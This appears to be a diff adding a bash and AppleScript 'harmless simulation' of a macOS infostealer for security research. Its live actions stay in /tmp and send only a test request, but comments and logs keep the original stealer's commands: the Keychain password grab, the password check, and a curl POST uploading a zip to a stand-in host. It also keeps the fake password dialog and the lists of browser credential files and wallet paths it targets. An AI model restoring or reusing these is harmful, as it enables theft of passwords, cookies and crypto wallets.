@@ -1,0 +1,486 @@
+#!/bin/bash
+
+# 无害化恶意软件模拟脚本
+# 复现原始的bash调用AppleScript结构
+# 完全安全，仅用于安全研究和攻击流程测试
+
+echo "🔄 启动恶意软件攻击流程模拟 (真实网络连接版本)"
+echo "📝 日志文件: /tmp/malware_simulation.log"
+echo "🌐 网络连接: 真实连接到 www.baidu.com 进行测试"
+echo "📁 文件操作: 在 /tmp 目录创建真实的测试文件"
+echo "🔒 安全保证: 不会窃取或发送任何真实敏感数据"
+echo ""
+
+# 执行无害化的AppleScript（通过bash调用osascript，与原始结构相同）
+/bin/bash -c "osascript -e '
+-- 无害化恶意软件模拟脚本
+-- 保持与原始脚本相同的结构和调用方式
+
+-- 日志记录函数
+on logAction(action)
+    set logFile to \"/tmp/malware_simulation.log\"
+    set timestamp to (current date) as string
+    set logEntry to timestamp & \" - \" & action & return
+    
+    try
+        set fileRef to open for access logFile with write permission
+        write logEntry to fileRef starting at eof
+        close access fileRef
+    on error
+        try
+            close access logFile
+        end try
+    end try
+end logAction
+
+-- 设置模拟标志（与原始相同）
+set release to true
+set filegrabbers to true
+
+logAction(\"=== 恶意软件攻击流程模拟开始 ===\")
+
+-- 模拟隐藏终端窗口（原始功能的无害化版本）
+if release then
+    try
+        logAction(\"模拟: 隐藏终端窗口 - tell window 1 of application Terminal to set visible to false\")
+        -- 原始: tell window 1 of application \"Terminal\" to set visible to false
+        display notification \"模拟: 隐藏终端窗口\" with title \"恶意软件模拟\"
+    end try
+end if
+
+-- 文件大小检查函数（无害化）
+on filesizer(paths)
+    set fsz to 0
+    try
+        logAction(\"模拟: 检查文件大小 - \" & paths)
+        -- 原始: set fsz to (do shell script \"/usr/bin/mdls -name kMDItemFSSize -raw \" & theItem)
+        set fsz to 1024  -- 返回模拟大小
+    end try
+    return fsz
+end filesizer
+
+-- 目录创建函数（无害化）
+on mkdir(someItem)
+    try
+        logAction(\"模拟: 创建目录 - \" & someItem)
+        -- 原始: do shell script \"mkdir -p \" & filePosixPath
+        -- 无害化: 不实际创建目录
+    end try
+end mkdir
+
+-- 文件名提取函数（保持原始逻辑）
+on FileName(filePath)
+    try
+        set reversedPath to (reverse of every character of filePath) as string
+        set trimmedPath to text 1 thru ((offset of \"/\" in reversedPath) - 1) of reversedPath
+        set finalPath to (reverse of every character of trimmedPath) as string
+        return finalPath
+    end try
+end FileName
+
+-- 目录路径提取函数（保持原始逻辑）
+on BeforeFileName(filePath)
+    try
+        set lastSlash to offset of \"/\" in (reverse of every character of filePath) as string
+        set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
+        return trimmedPath
+    end try
+end BeforeFileName
+
+-- 写入文本函数（测试版本 - 真实写入到安全位置）
+on writeText(textToWrite, filePath)
+    try
+        logAction(\"写入测试文件 - \" & filePath)
+        
+        -- 确保只写入到安全的/tmp目录
+        if filePath starts with \"/tmp/\" then
+            try
+                -- 创建目录结构
+                set folderPath to BeforeFileName(filePath)
+                do shell script \"mkdir -p \" & quoted form of folderPath
+                
+                -- 写入文件（真实操作，但在安全位置）
+                set fileRef to (open for access filePath with write permission)
+                write textToWrite to fileRef starting at eof
+                close access fileRef
+                
+                logAction(\"✅ 文件写入成功: \" & filePath)
+                logAction(\"文件内容长度: \" & (length of textToWrite) & \" 字符\")
+            on error write_error
+                logAction(\"❌ 文件写入失败: \" & write_error)
+                try
+                    close access filePath
+                end try
+            end try
+        else
+            logAction(\"🛡️ 安全限制: 拒绝写入到非安全位置 - \" & filePath)
+        end if
+    end try
+end writeText
+
+-- 文件读写函数（无害化）
+on readwrite(path_to_file, path_as_save)
+    try
+        logAction(\"模拟: 复制文件 \" & path_to_file & \" 到 \" & path_as_save)
+        -- 原始: do shell script \"cat \" & quoted form of path_to_file & \" > \" & quoted form of path_as_save
+        -- 无害化: 不实际复制文件
+    end try
+end readwrite
+
+-- Finder文件复制函数（无害化）
+on readwrite2(path_to_file, path_as_save)
+    try
+        logAction(\"模拟: Finder复制文件 \" & path_to_file & \" 到 \" & path_as_save)
+        -- 原始: tell application Finder to duplicate file
+        -- 无害化: 不实际复制文件
+    end try
+end readwrite2
+
+-- 目录检查函数（无害化）
+on isDirectory(someItem)
+    try
+        logAction(\"模拟: 检查是否为目录 - \" & someItem)
+        -- 原始: do shell script \"file -b \" & filePosixPath
+        return false  -- 总是返回false避免实际操作
+    end try
+end isDirectory
+
+-- 文件夹抓取函数（无害化）
+on GrabFolderLimit(sourceFolder, destinationFolder)
+    try
+        logAction(\"模拟: 限制抓取文件夹 \" & sourceFolder & \" 到 \" & destinationFolder)
+        -- 模拟异常列表检查
+        set exceptionsList to {\".DS_Store\", \"Partitions\", \"Code Cache\", \"Cache\", \"market-history-cache.json\", \"journals\", \"Previews\"}
+        logAction(\"模拟: 应用异常文件过滤\")
+        -- 原始: 实际遍历和复制文件
+        -- 无害化: 只记录操作
+    end try
+end GrabFolderLimit
+
+-- 文件夹抓取函数（无害化）
+on GrabFolder(sourceFolder, destinationFolder)
+    try
+        logAction(\"模拟: 抓取文件夹 \" & sourceFolder & \" 到 \" & destinationFolder)
+        -- 模拟更大的异常列表
+        set exceptionsList to {\".DS_Store\", \"Partitions\", \"Code Cache\", \"Cache\", \"market-history-cache.json\", \"journals\", \"Previews\", \"dumps\", \"emoji\", \"user_data\", \"__update__\", \"user_data#2\", \"user_data#3\"}
+        logAction(\"模拟: 应用扩展异常文件过滤\")
+        -- 无害化: 不实际操作文件
+    end try
+end GrabFolder
+
+-- Firefox数据解析（无害化）
+on parseFF(firefox, writemind)
+    try
+        logAction(\"模拟: 解析Firefox数据 \" & firefox)
+        set myFiles to {\"/cookies.sqlite\", \"/formhistory.sqlite\", \"/key4.db\", \"/logins.json\"}
+        repeat with FFile in myFiles
+            logAction(\"模拟: 处理Firefox文件 \" & FFile)
+        end repeat
+        -- 原始: 实际读取Firefox配置文件
+        -- 无害化: 只记录目标文件
+    end try
+end parseFF
+
+-- 密码验证函数（无害化）
+on checkvalid(username, password_entered)
+    try
+        logAction(\"模拟: 验证用户密码 - \" & username)
+        -- 原始: do shell script \"dscl . authonly \" & quoted form of username & space & quoted form of password_entered
+        -- 无害化: 总是返回false，不进行实际验证
+        return false
+    end try
+end checkvalid
+
+-- 密码获取函数（无害化）
+on getpwd(username, writemind)
+    try
+        logAction(\"模拟: 尝试获取用户密码\")
+        
+        if checkvalid(username, \"\") then
+            logAction(\"模拟: 尝试从Keychain获取Chrome主密码\")
+            -- 原始: do shell script \"security 2>&1 > /dev/null find-generic-password -ga Chrome | awk {print $2}\"
+            -- 无害化: 不实际访问Keychain
+        else
+            -- 模拟密码提示对话框（明确标识为测试）
+            try
+                set result to display dialog \"⚠️ 恶意软件模拟测试 ⚠️\" & return & return & \"这是原始恶意软件会显示的欺骗性对话框:\" & return & \"Required Application Helper.\" & return & \"Please enter password for continue.\" & return & return & \"输入 test 继续模拟，或点击取消退出\" default answer \"\" with icon caution buttons {\"取消\", \"继续模拟\"} default button \"继续模拟\" giving up after 15 with title \"恶意软件模拟 - System Preferences\"
+                set password_entered to text returned of result
+                if password_entered is equal to \"test\" then
+                    logAction(\"模拟: 用户输入了测试密码\")
+                    writeText(\"模拟密码: test\", writemind & \"pwd\")
+                    return \"test\"
+                end if
+            on error
+                logAction(\"模拟: 用户取消了密码输入或超时\")
+            end try
+        end if
+    end try
+    return \"\"
+end getpwd
+
+-- 插件抓取函数（无害化）
+on grabPlugins(paths, savePath, pluginList, index)
+    try
+        logAction(\"模拟: 抓取浏览器插件 \" & paths)
+        -- 只记录前几个插件ID用于演示
+        repeat with Plugin in pluginList
+            logAction(\"模拟: 处理插件 \" & Plugin)
+            if Plugin contains \"nkbihfbeogaeaoehlefnkodbefgpgknn\" then
+                logAction(\"⚠️ 检测到MetaMask插件ID\")
+            end if
+        end repeat
+    end try
+end grabPlugins
+
+-- Chromium浏览器数据处理（无害化）
+on chromium(writemind, chromium_map)
+    -- 使用真实的插件ID列表（前10个用于演示）
+    set pluginList to {\"keenhcnmdmjjhincpilijphpiohdppno\", \"hbbgbephgojikajhfbomhlmmollphcad\", \"nkbihfbeogaeaoehlefnkodbefgpgknn\", \"hnfanknocfeofbddgcijnmhnfnkdnaad\", \"egjidjbpglichdcondbcbdnbeeppgdph\"}
+    set chromiumFiles to {\"/Network/Cookies\", \"/Cookies\", \"/Web Data\", \"/Login Data\", \"/Local Extension Settings/\", \"/IndexedDB/\"}
+    
+    repeat with chromium in chromium_map
+        try
+            logAction(\"模拟: 处理浏览器 \" & item 1 of chromium & \" - \" & item 2 of chromium)
+            repeat with CFile in chromiumFiles
+                logAction(\"模拟: 目标文件 \" & CFile)
+                if CFile is equal to \"/Local Extension Settings/\" then
+                    grabPlugins(\"模拟路径\", \"模拟保存路径\", pluginList, false)
+                end if
+            end repeat
+        end try
+    end repeat
+end chromium
+
+-- Telegram数据处理（无害化）
+on telegram(writemind, library)
+    try
+        logAction(\"模拟: 抓取Telegram数据 - \" & library & \"Telegram Desktop/tdata/\")
+    end try
+end telegram
+
+-- 桌面钱包处理（无害化）
+on deskwallets(writemind, deskwals)
+    repeat with deskwal in deskwals
+        try
+            logAction(\"模拟: 处理钱包 \" & item 1 of deskwal & \" - \" & item 2 of deskwal)
+        end try
+    end repeat
+end deskwallets
+
+-- 文件抓取函数（无害化）
+on filegrabber(writemind)
+    try
+        logAction(\"模拟: 启动文件抓取器\")
+        set extensionsList to {\"txt\", \"pdf\", \"docx\", \"wallet\", \"key\", \"keys\", \"doc\"}
+        
+        logAction(\"模拟: 处理Safari Cookies\")
+        logAction(\"模拟: 处理Notes数据库\")
+        logAction(\"模拟: 扫描桌面文件\")
+        logAction(\"模拟: 扫描文档目录\")
+        logAction(\"模拟: 扫描下载目录\")
+        
+        repeat with ext in extensionsList
+            logAction(\"模拟: 搜索 .\" & ext & \" 文件类型\")
+        end repeat
+    end try
+end filegrabber
+
+-- 数据发送函数（真实网络连接但安全）
+on send_data(attempt)
+    try
+        logAction(\"模拟: 尝试发送数据到C&C服务器 (尝试 \" & attempt & \"/3)\")
+        
+        -- 原始恶意命令的日志记录（不执行）
+        set original_curl to \"curl -X POST -H user: xxxxxxxxxxxxxxxxxxxxxxxx -H BuildID: xxxxxxxxxxxxxxxxxxxxxxx -H cl: 0 -H cn: 0 --max-time 300 -retry 5 -retry-delay 10 -F file=@/tmp/out.zip https://www.baidu.com/contact\"
+        logAction(\"原始恶意curl命令: \" & original_curl)
+        
+        -- 执行真实但安全的网络连接测试（GET请求到百度）
+        logAction(\"执行安全的网络连接测试: curl -s -o /dev/null -w %{http_code} www.baidu.com\")
+        
+        try
+            set http_response to (do shell script \"curl -s -o /dev/null -w '%{http_code}' www.baidu.com\")
+            logAction(\"网络连接测试结果: HTTP \" & http_response)
+            
+            if http_response is \"200\" then
+                logAction(\"✅ 网络连接成功 - 在真实环境中，恶意数据将被发送到: https://badly.com/contact\")
+                display notification \"网络连接测试成功\" with title \"恶意软件模拟\"
+                
+                -- 模拟发送请求头信息（记录但不发送敏感数据）
+                logAction(\"模拟发送的认证头: user: xxxxxxxxxxxx\")
+                logAction(\"模拟发送的构建ID: BuildID: xxxxxxxxxxxxxxxxxxxxxxxxxxx\")
+                logAction(\"模拟上传文件: /tmp/out.zip (不包含真实数据)\")
+                
+                return true
+            else
+                logAction(\"❌ 网络连接失败: HTTP \" & http_response)
+                error \"网络连接失败\"
+            end if
+            
+        on error network_error
+            logAction(\"❌ 网络连接错误: \" & network_error)
+            error \"网络连接失败\"
+        end try
+        
+    on error send_error
+        if attempt < 3 then -- 限制重试次数
+            logAction(\"🔄 发送失败，1秒后重试: \" & send_error)
+            delay 1
+            send_data(attempt + 1)
+        else
+            logAction(\"❌ 达到最大重试次数，模拟发送失败\")
+            display notification \"网络连接测试失败\" with title \"恶意软件模拟\"
+        end if
+    end try
+end send_data
+
+-- 主执行流程（与原始结构相同但无害化）
+try
+    logAction(\"开始主执行流程\")
+    
+    -- 获取用户名和配置路径
+    set username to (system attribute \"USER\")
+    set profile to \"/Users/\" & username
+    set randomNumber to (random number from 1000 to 9999) as string
+    set writemind to \"/tmp/\" & randomNumber & \"/\"
+    
+    logAction(\"收集系统信息（安全版本）\")
+    -- 原始恶意命令: do shell script \"system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType\"
+    -- 安全版本: 只收集基本的非敏感信息
+    try
+        set system_info to (do shell script \"echo '=== 系统基本信息 ===' && echo 'macOS版本:' && sw_vers && echo '' && echo 'CPU信息:' && sysctl -n machdep.cpu.brand_string && echo '' && echo '内存信息:' && echo $(sysctl -n hw.memsize | awk '{print $1/1024/1024/1024 \\\" GB\\\"}') && echo '' && echo '当前用户:' && whoami && echo '' && echo '系统运行时间:' && uptime\")
+        logAction(\"✅ 成功收集系统信息\")
+        writeText(system_info, writemind & \"info\")
+        logAction(\"系统信息已写入: \" & writemind & \"info\")
+    on error sys_error
+        logAction(\"❌ 系统信息收集失败: \" & sys_error)
+        writeText(\"系统信息收集失败\", writemind & \"info\")
+    end try
+    
+    set library to profile & \"/Library/Application Support/\"
+    set password_entered to getpwd(username, writemind)
+    delay 0.01
+    
+    -- 浏览器映射（与原始相同）
+    set chromiumMap to {{\"Chrome\", library & \"Google/Chrome/\"}, {\"Brave\", library & \"BraveSoftware/Brave-Browser/\"}, {\"Edge\", library & \"Microsoft Edge/\"}, {\"Vivaldi\", library & \"Vivaldi/\"}, {\"Opera\", library & \"com.operasoftware.Opera/\"}, {\"OperaGX\", library & \"com.operasoftware.OperaGX/\"}, {\"Chrome Beta\", library & \"Google/Chrome Beta/\"}, {\"Chrome Canary\", library & \"Google/Chrome Canary\"}, {\"Chromium\", library & \"Chromium/\"}, {\"Chrome Dev\", library & \"Google/Chrome Dev/\"}, {\"Arc\", library & \"Arc/\"}, {\"Coccoc\", library & \"Coccoc/\"}}
+    
+    -- 钱包映射（与原始相同）
+    set walletMap to {{\"deskwallets/Electrum\", profile & \"/.electrum/wallets/\"}, {\"deskwallets/Coinomi\", library & \"Coinomi/wallets/\"}, {\"deskwallets/Exodus\", library & \"Exodus/\"}, {\"deskwallets/Atomic\", library & \"atomic/Local Storage/leveldb/\"}, {\"deskwallets/Wasabi\", profile & \"/.walletwasabi/client/Wallets/\"}, {\"deskwallets/Ledger_Live\", library & \"Ledger Live/\"}, {\"deskwallets/Monero\", profile & \"/Monero/wallets/\"}, {\"deskwallets/Bitcoin_Core\", library & \"Bitcoin/wallets/\"}, {\"deskwallets/Litecoin_Core\", library & \"Litecoin/wallets/\"}, {\"deskwallets/Dash_Core\", library & \"DashCore/wallets/\"}, {\"deskwallets/Electrum_LTC\", profile & \"/.electrum-ltc/wallets/\"}, {\"deskwallets/Electron_Cash\", profile & \"/.electron-cash/wallets/\"}, {\"deskwallets/Guarda\", library & \"Guarda/\"}, {\"deskwallets/Dogecoin_Core\", library & \"Dogecoin/wallets/\"}, {\"deskwallets/Trezor_Suite\", library & \"@trezor/suite-desktop/\"}}
+    
+    -- 模拟各种数据处理
+    logAction(\"模拟: 处理Binance配置\")
+    readwrite(library & \"Binance/app-store.json\", writemind & \"deskwallets/Binance/app-store.json\")
+    
+    logAction(\"模拟: 处理TonKeeper配置\")
+    readwrite(library & \"@tonkeeper/desktop/config.json\", \"deskwallets/TonKeeper/config.json\")
+    
+    logAction(\"模拟: 处理Keychain数据\")
+    readwrite(profile & \"/Library/Keychains/login.keychain-db\", writemind & \"keychain\")
+    
+    if release then
+        logAction(\"模拟: Release模式 - 处理系统敏感文件\")
+        readwrite2(profile & \"/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite\", writemind & \"FileGrabber/NoteStore.sqlite\")
+        readwrite2(profile & \"/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal\", writemind & \"FileGrabber/NoteStore.sqlite-wal\")
+        readwrite2(profile & \"/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm\", writemind & \"FileGrabber/NoteStore.sqlite-shm\")
+        readwrite2(profile & \"/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies\", writemind & \"FileGrabber/Cookies.binarycookies\")
+        readwrite(profile & \"/Library/Cookies/Cookies.binarycookies\", writemind & \"FileGrabber/saf1\")
+    end if
+    
+    if filegrabbers then
+        filegrabber(writemind)
+    end if
+    
+    writeText(username, writemind & \"username\")
+    
+    -- Firefox处理
+    set ff_paths to {library & \"Firefox/Profiles/\", library & \"Waterfox/Profiles/\", library & \"Pale Moon/Profiles/\"}
+    repeat with firefox in ff_paths
+        try
+            parseFF(firefox, writemind)
+        end try
+    end repeat
+    
+    -- 处理各种数据源
+    chromium(writemind, chromiumMap)
+    deskwallets(writemind, walletMap)
+    telegram(writemind, library)
+    
+    -- 真实的数据压缩过程（用于测试）
+    logAction(\"创建测试压缩包\")
+    try
+        -- 原始命令: do shell script \"ditto -c -k --sequesterRsrc \" & writemind & \" /tmp/out.zip\"
+        -- 测试版本: 创建真实的压缩包但内容无害
+        set test_zip to \"/tmp/malware_test_\" & randomNumber & \".zip\"
+        do shell script \"ditto -c -k --sequesterRsrc \" & quoted form of writemind & \" \" & quoted form of test_zip
+        
+        -- 检查压缩包大小
+        set zip_size to (do shell script \"ls -lh \" & quoted form of test_zip & \" | awk '{print $5}'\")
+        logAction(\"✅ 压缩包创建成功: \" & test_zip & \" (大小: \" & zip_size & \")\")
+        
+        -- 记录压缩包内容
+        set zip_content to (do shell script \"unzip -l \" & quoted form of test_zip & \" | tail -n +4 | head -n -2\")
+        logAction(\"压缩包内容列表:\")
+        logAction(zip_content)
+        
+    on error zip_error
+        logAction(\"❌ 压缩包创建失败: \" & zip_error)
+        set test_zip to \"\"
+    end try
+    
+    send_data(0)
+    
+    -- 真实的清理痕迹过程
+    logAction(\"开始清理测试文件\")
+    try
+        -- 清理临时目录
+        if writemind is not \"\" then
+            do shell script \"rm -rf \" & quoted form of writemind
+            logAction(\"✅ 已删除临时目录: \" & writemind)
+        end if
+        
+        -- 清理压缩包
+        if test_zip is not \"\" then
+            do shell script \"rm -f \" & quoted form of test_zip
+            logAction(\"✅ 已删除测试压缩包: \" & test_zip)
+        end if
+        
+        logAction(\"🧹 清理完成 - 所有测试文件已删除\")
+        
+    on error cleanup_error
+        logAction(\"❌ 清理过程中出现错误: \" & cleanup_error)
+    end try
+    
+    logAction(\"=== 恶意软件攻击流程模拟结束 ===\")
+    
+    -- 显示完成报告
+    display dialog \"🎯 恶意软件攻击流程模拟完成！\" & return & return & \"本次模拟完整复现了原始恶意软件的攻击流程：\" & return & \"✅ bash调用osascript的执行方式\" & return & \"✅ 隐藏终端窗口\" & return & \"✅ 真实系统信息收集\" & return & \"✅ 密码窃取尝试\" & return & \"✅ 浏览器数据扫描\" & return & \"✅ 加密货币钱包扫描\" & return & \"✅ 文件创建和操作\" & return & \"✅ 真实网络连接测试\" & return & \"✅ 数据压缩过程\" & return & \"✅ 痕迹清理\" & return & return & \"🌐 网络连接: 已测试连接到 www.baidu.com\" & return & \"📁 文件操作: 已在 /tmp 创建真实测试文件\" & return & \"📊 详细日志: /tmp/malware_simulation.log\" with title \"攻击流程模拟报告\" buttons {\"查看日志\", \"完成\"} default button \"完成\"
+    
+    set buttonPressed to button returned of result
+    if buttonPressed is \"查看日志\" then
+        do shell script \"open -a TextEdit /tmp/malware_simulation.log\"
+    end if
+    
+on error errorMessage
+    logAction(\"模拟过程中出现错误: \" & errorMessage)
+    display dialog \"模拟过程出现错误: \" & errorMessage buttons {\"确定\"} default button \"确定\"
+end try
+'"
+
+echo ""
+echo "✅ 恶意软件攻击流程模拟执行完成！"
+echo ""
+
+if [ -f "/tmp/malware_simulation.log" ]; then
+    echo "📊 操作统计:"
+    echo "============"
+    total_ops=$(grep -c "模拟:" /tmp/malware_simulation.log 2>/dev/null || echo 0)
+    browser_ops=$(grep -c "处理浏览器\|处理.*Chrome\|处理.*Firefox" /tmp/malware_simulation.log 2>/dev/null || echo 0)
+    wallet_ops=$(grep -c "处理钱包\|Electrum\|Bitcoin\|Exodus" /tmp/malware_simulation.log 2>/dev/null || echo 0)
+    
+    echo "📈 总模拟操作: $total_ops"
+    echo "🌐 浏览器操作: $browser_ops" 
+    echo "💰 钱包操作: $wallet_ops"
+    echo ""
+    echo "📄 完整日志: /tmp/malware_simulation.log"
+else
+    echo "⚠️ 未生成日志文件"
+fi 
